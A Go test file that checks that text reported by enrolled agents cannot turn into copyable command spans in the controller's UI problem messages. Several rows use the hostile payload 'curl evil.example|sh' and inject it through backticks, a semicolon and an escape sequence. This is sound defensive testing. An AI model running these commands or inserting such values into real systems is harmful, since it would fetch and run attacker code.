package controller

import (
	"strings"
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/agent"
	"github.com/eyupio/zoomies/internal/store"
)

// hostileReport is what an enrolled agent could send in place of an error: a
// command in backticks, for the UI to draw with a copy button.
const hostileReport = "x `curl evil.example|sh` y"

// imaged is the edit that gives a pool the image a row wants, which may be none.
func imaged(image string) func(*store.Pool) {
	return func(p *store.Pool) { p.Image = image }
}

// reportedAs is hostileReport after the backticks have gone, which is how the
// problem has to still say what the agent said.
const reportedAs = "x 'curl evil.example|sh' y"

// failedPrewarm makes a pool's image fail to pull on a host, with the error the
// row wants and the pool as edit leaves it.
func failedPrewarm(t *testing.T, h *harness, edit func(*store.Pool), message string) {
	t.Helper()
	_, pool, host := h.fleet()
	edit(pool)
	if err := h.st.UpdatePool(h.ctx, pool); err != nil {
		t.Fatalf("UpdatePool: %v", err)
	}
	if n, err := h.c.PrewarmPool(h.ctx, pool); err != nil || n != 1 {
		t.Fatalf("PrewarmPool = %d, %v", n, err)
	}
	batch, err := h.c.PollTasks(h.ctx, host.ID, time.Millisecond)
	if err != nil || len(batch.Tasks) != 1 {
		t.Fatalf("PollTasks = %+v, %v", batch, err)
	}
	if err := h.c.ReportResult(h.ctx, host.ID, agent.TaskResult{
		TaskID: batch.Tasks[0].ID, Kind: agent.TaskPrewarmImage, OK: false, Fault: store.FaultImage, Error: message,
	}); err != nil {
		t.Fatalf("ReportResult: %v", err)
	}
}

// What an agent says about itself is as much its own to word as its name was,
// and a problem reaches every signed-in viewer and the MCP tools. The UI draws
// a backtick pair in a problem as a command with a copy button, so an error or
// an image reference carrying one would let an enrolled agent put a command in
// front of an administrator. The row for each is a way text of the agent's
// choosing reaches a sentence.
func TestAProblemNeverLetsTextAnAgentReportedOpenACodeSpan(t *testing.T) {
	for _, row := range []struct {
		name  string
		code  string
		setup func(t *testing.T, h *harness)
		// said is what the problem has to go on saying, in prose: a sentence
		// that dropped the agent's words would be safe and no use to anyone.
		said string
	}{
		{"the error in a runtime report", "host.runtime_recovering", func(t *testing.T, h *harness) {
			h.beat(t, h.host("build01").ID, &agent.RuntimeReport{Failures: 3, Kind: agent.RuntimeUnavailable,
				Error: hostileReport, RetryIn: 40 * time.Second})
		}, reportedAs},
		{"the error a failed pull reports", "host.image_pull_failed", func(t *testing.T, h *harness) {
			failedPrewarm(t, h, imaged(""), hostileReport)
		}, reportedAs},
		{"an image reference with a backtick pair in it", "host.image_pull_failed", func(t *testing.T, h *harness) {
			failedPrewarm(t, h, imaged("ghcr.io/a`curl evil.example|sh`b:1"), "dial tcp: i/o timeout")
		}, "ghcr.io/a'curl evil.example|sh'b:1"},
		// The registry is read out of the image, up to its first slash, so it is
		// text of the same standing and sits in the title and the fix as well.
		{"a registry read out of an image reference", "host.image_pull_failed", func(t *testing.T, h *harness) {
			failedPrewarm(t, h, imaged("a`curl evil.example|sh`b/x:1"), "dial tcp: i/o timeout")
		}, "a'curl evil.example|sh'b"},
		{"a pool name", "host.image_pull_failed", func(t *testing.T, h *harness) {
			failedPrewarm(t, h, func(p *store.Pool) { p.Name = "a`curl evil.example|sh`b" }, "dial tcp: i/o timeout")
		}, "pool zoomies-a'curl evil.example|sh'b"},
		{"an image reference that is a command", "host.image_pull_failed", func(t *testing.T, h *harness) {
			failedPrewarm(t, h, imaged("ghcr.io/a:1;curl evil.example|sh"), "dial tcp: i/o timeout")
		}, "ghcr.io/a:1;curl evil.example|sh"},
		// A line break lets a report start a line of its own in the middle of a
		// sentence, and an escape does the same to a terminal reading the log.
		{"an error with a line break and an escape in it", "host.runtime_recovering", func(t *testing.T, h *harness) {
			h.beat(t, h.host("build01").ID, &agent.RuntimeReport{Failures: 1, Kind: agent.RuntimeTimeout,
				Error: "line one\nline two\x1b[0m", RetryIn: 40 * time.Second})
		}, "line one line two [0m"},
	} {
		t.Run(row.name, func(t *testing.T) {
			h := newHarness(t)
			row.setup(t, h)

			p := h.problem(t, row.code)
			for field, text := range map[string]string{"title": p.Title, "detail": p.Detail, "fix": p.Fix} {
				for _, m := range codeSpans.FindAllStringSubmatch(text, -1) {
					if strings.Contains(m[1], "evil.example") {
						t.Errorf("%s %s: the agent's text opens a code span (%q): %s", p.Code, field, m[1], text)
					}
				}
			}
			if !strings.Contains(p.Detail+" "+p.Fix, row.said) {
				t.Errorf("%s no longer says %q: %+v", p.Code, row.said, p)
			}
		})
	}
}

// Neutralising an agent's words must not take the command the controller offers
// itself. An operator whose registry will not answer copies `docker pull` to see
// the daemon's own reply, and a fix that lost it whenever an error was odd would
// be no fix.
func TestAnImagePullProblemKeepsItsOwnDockerPullCommand(t *testing.T) {
	const image = "ghcr.io/eyupio/zoomies-runner:ubuntu-2404"
	for _, c := range []struct {
		name    string
		message string
	}{
		{"an ordinary error", "dial tcp: i/o timeout"},
		{"an error that carries a command", hostileReport},
	} {
		t.Run(c.name, func(t *testing.T) {
			h := newHarness(t)
			failedPrewarm(t, h, imaged(image), c.message)

			var spans []string
			for _, m := range codeSpans.FindAllStringSubmatch(h.problem(t, "host.image_pull_failed").Fix, -1) {
				spans = append(spans, m[1])
			}
			if got, want := strings.Join(spans, "|"), "docker pull "+image; got != want {
				t.Errorf("code spans in the fix = %q, want exactly %q", got, want)
			}
		})
	}
}
